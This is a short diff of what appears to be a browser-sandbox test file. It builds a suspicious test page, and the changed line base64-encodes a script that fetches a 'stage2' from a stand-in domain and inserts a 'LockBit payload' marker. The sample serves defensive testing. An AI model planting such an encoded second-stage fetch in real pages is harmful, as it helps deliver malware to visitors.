@@ -47,7 +47,7 @@ process.env.BROWSER_SANDBOX_ALLOW_LOCAL_TARGETS = '1'
 process.env.CHROMIUM_BIN ||= chromium.executablePath()
 
 const payloadDomain = 'payload.example.test'
-const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.write("LockBit payload");`).toString('base64')
+const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.body.insertAdjacentHTML("beforeend", "<p>LockBit payload</p>");`).toString('base64')
 const pages = new Map<string, string>([
     ['/start', `<!doctype html>
 <html><head><title>Initial suspicious page</title></head>
